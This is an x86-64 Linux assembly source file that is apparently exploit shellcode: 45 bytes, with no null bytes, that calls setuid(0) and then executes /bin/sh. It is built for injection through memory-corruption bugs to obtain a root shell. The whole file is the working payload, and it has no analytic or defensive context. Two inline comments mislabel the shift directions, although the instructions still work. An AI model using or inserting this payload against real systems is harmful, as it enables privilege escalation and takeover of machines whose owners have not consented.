/*
  setuid(0)
  execve("/bin/sh", [], [])
  45 bytes
*/      
        
.section .text
.global _start

_start:
        xor %rdi, %rdi                    # %rdi is ruid 0
        push $105                         # push syscall 105
        pop %rax                          # pop to avoid null bytes from mov
        syscall                           # setuid

        xor  %rax, %rax                   # zero out rax
        push %rax                         # push to stack so we have a pointer to 0
        mov  %rsp, %rsi
        mov  %rsp, %rdx                   # rdx and rsi are now []

        mov  $0x2368732f6e69622f, %rbx    # rbx is now the hex value of "/bin/sh#"
        shl  $0x08, %rbx                  # shift right, deleting the '#' character
        shr  $0x08, %rbx                  # shift left, leaving a null byte at the end

        push %rbx                         # push hex value of "/bin/sh" to the stack
        mov  %rsp, %rdi                   # rdi is now the string "/bin/sh"

                                          # execve arguments:
                                          # %rdi: char *filename = "/bin/sh"
                                          # %rsi: char *argv[] = []
                                          # %rdx: char *envp[] = [] 
        
        push $59                          # push syscall 59
        pop  %rax                         # pop to avoid null bytes from mov
        syscall                           # execve
